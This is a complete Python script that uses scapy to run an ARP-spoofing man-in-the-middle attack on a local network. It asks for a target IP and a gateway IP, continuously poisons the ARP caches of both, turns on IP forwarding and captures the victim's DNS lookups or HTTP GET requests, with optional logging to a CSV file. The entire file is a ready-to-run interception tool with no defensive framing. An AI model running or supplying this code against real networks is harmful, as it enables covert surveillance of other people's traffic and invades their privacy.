# -*- coding: utf-8 -*-
# requred scapy
#
# [scapy installing]
# wget scapy.net
# unzip scapy-latest.zip
# cd scapy-2.*
# sudo python setup.py install
#
# OS: Linux based (tested on Debian)
# Python version: 2.7.6 (tested)
# Author: Carlo Cervellin
# Version: 0.2

from scapy.all import *
import threading
import os
import sys
from datetime import datetime

# gets mac address from ip
def get_MACaddress(ip) :
	pack = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip, hwdst="ff:ff:ff:ff:ff:ff")
	resp = srp1(pack, verbose=0, timeout=2)
	if resp :
		return resp.hwsrc
	else :
		return None

# victim poisoning, sends ARP packets to victim by faking gateway
def v_poison() :
	p = Ether(dst=V_MAC)/ARP(psrc=GW_IP, pdst=V_IP, hwdst=V_MAC)
	while True :
		try :
			srp1(p, verbose=0, timeout=1)
		except KeyboardInterrupt :
			sys.exit(1)

# gateway poisoning, sends ARP packets to the gateway by faking victim
def gw_poison() :
	p = Ether(dst=GW_MAC)/ARP(psrc=V_IP, pdst=GW_IP, hwdst=GW_MAC)
	while True :
		try :
			srp1(p, verbose=0, timeout=1)
		except KeyboardInterrupt :
			sys.exit(1)

# captures and displays dns traffic of a packet
def dnshandle(pkt):
	# adding sourcecondition
	try : 
		pkt.getlayer(IP).src 
		pkt.getlayer(Ether).src 
	except AttributeError :
		return
	if  pkt.getlayer(IP).src==V_IP and pkt.getlayer(Ether).src==V_MAC and pkt.haslayer(DNS) and pkt.getlayer(DNS).qr==0 :
		date = datetime.now().strftime('[%Y-%m-%d %H:%M:%S]')
		print(date+" Victim: "+pkt.getlayer(IP).src+" ("+pkt.getlayer(Ether).src+")"+" is resolving "+pkt.getlayer(DNS).qd.qname)
		if not SAVE_FILE_PATH == "" :
			save_to_csv_file([date,pkt.getlayer(IP).src,pkt.getlayer(Ether).src,pkt.getlayer(DNS).qd.qname])

# captures and displays http get requests
def http_spoof_resquest(pkt) :
	if pkt.haslayer(TCP) and pkt.getlayer(TCP).dport==80 :
		try :
			# getting GET request and Host header
			raw_content = str(pkt)
			lines = raw_content.split("\r\n")
			get_request = ""
			host_request = ""
			for line in lines :
				if "GET" in line :
					get_line = line.split(" ")
					for index, l in enumerate(get_line) :
						if "GET" in l :
							get_request = get_line[index+1]
				if "Host:" in line :
					host_request = line.split(" ")[1]
			# checking if packet has source fields
			try : 
				pkt.getlayer(IP).src 
				pkt.getlayer(Ether).src 
			except AttributeError :
				return
			# displaying content if GET request is found and if it is from Victim
			if  pkt.getlayer(IP).src==V_IP and pkt.getlayer(Ether).src==V_MAC and not get_request == "" : 
				date = datetime.now().strftime('[%Y-%m-%d %H:%M:%S]')
				print(date+" Victim: "+pkt.getlayer(IP).src+" ("+pkt.getlayer(Ether).src+")"+" is requiring document: "+host_request+get_request)
				if not SAVE_FILE_PATH == "" :
					save_to_csv_file([date,pkt.getlayer(IP).src,pkt.getlayer(Ether).src,host_request+get_request])
		except IndexError :
			return

def save_to_csv_file(elements) :
	out_file = open(SAVE_FILE_PATH,"a")
	cs = ""
	for index, el in enumerate(elements) :
		if index == len(elements) - 1 :
			cs += el
		else :
			cs += el+","
	out_file.write(cs+"\n")

def program_header(elements) :
	elements.insert(len(elements),"")
	elements.insert(0,"")
	longest = 0
	sep = '#'
	for elm in elements :
		if len(elm) > longest :
			longest = len(elm)
	print(sep*(longest+4))
	for elm in elements :
		print(sep+" "+elm+" "*(longest-len(elm))+" "+sep)
	print(sep*(longest+4))


# presentation
program_header([
	"ARP spoofing MITM",
	"Version: 0.2",
	"Author: Carlo Cervellin"
	])

# constants
ACTION_HTTP_REQUEST_SPOOFING = 0
ACTION_DNS_REQUEST_SPOOFING = 1

DEFAULT_GATEWAY_IP = "192.168.0.1"
DEFAULT_INTERFACE = "wlan0"

# receiving user input
V_IP = raw_input("Insert the IP address to attack: ")
GW_IP = raw_input("Insert the gateway IP address [default \""+DEFAULT_GATEWAY_IP+"\"]: ")
INTERFACE = raw_input("Insert the network interface name [default \""+DEFAULT_INTERFACE+"\"]: ")
_ACTION = raw_input("Choose the service you want to spoof:\n\t[0] HTTP\n\t[1] DNS\n\t[default/invalid] HTTP\n")
SAVE_FILE_PATH = raw_input("Save output file name or path [empty means no saving file]: ")

# checking user input chosen spoofing action
ACTION = 0
try :
	ACTION = int(_ACTION)
except ValueError :
	pass
ACTION_STRING = ""
if ACTION == ACTION_HTTP_REQUEST_SPOOFING :
	ACTION_STRING = "HTTP"
elif ACTION ==ACTION_DNS_REQUEST_SPOOFING :
	ACTION_STRING = "DNS"
else :
	ACTION = 0
	ACTION_STRING = "HTTP"

# checking user ip target and network interface and setting default in case missing
if GW_IP is None or GW_IP == "" :
	GW_IP = DEFAULT_GATEWAY_IP
if INTERFACE is None or INTERFACE == "" :
	INTERFACE = DEFAULT_INTERFACE

print("Spoofing "+V_IP+" "+ACTION_STRING+" traffic with gateway "+GW_IP+" from network interface "+INTERFACE+"")
_SAVE_FILE_ABSOLUTE_PATH = os.path.abspath(SAVE_FILE_PATH)
if not SAVE_FILE_PATH == "" :
	print("Saving output to file: "+_SAVE_FILE_ABSOLUTE_PATH)

# getting victim and gateway mac address
print("Obtaining MAC addresses...")
while True :
	V_MAC = get_MACaddress(V_IP)
	GW_MAC = get_MACaddress(GW_IP)
	if V_MAC is None :
		print("Cannot find victim MAC address ("+V_IP+"), retrying...")
	elif GW_MAC is None :
		print("Cannot find victim MAC address ("+GW_IP+"), retrying...")
	else :
		break

print("Victim: "+V_IP+" ("+V_MAC+")")
print("Gateway: "+GW_IP+" ("+GW_MAC+")")

print("Poisoning victim and gateway...")

# enable IP forwarding
os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')

vthread = []
gwthread = []

print("Showing victim "+ACTION_STRING+" requests...")

while True :
	vpoison = threading.Thread(target=v_poison)
	vpoison.setDaemon(True)
	vthread.append(vpoison)
	vpoison.start()

	gwpoison = threading.Thread(target=gw_poison)
	gwpoison.setDaemon(True)
	gwthread.append(gwpoison)
	gwpoison.start()

	if ACTION == ACTION_DNS_REQUEST_SPOOFING :
		sniff(iface=INTERFACE, filter='udp port 53', prn=dnshandle)
	elif ACTION == ACTION_HTTP_REQUEST_SPOOFING :
		sniff(iface=INTERFACE, filter='tcp port 80', prn=http_spoof_resquest)
	else :
		print("Missing action")
		sys.exit(1)


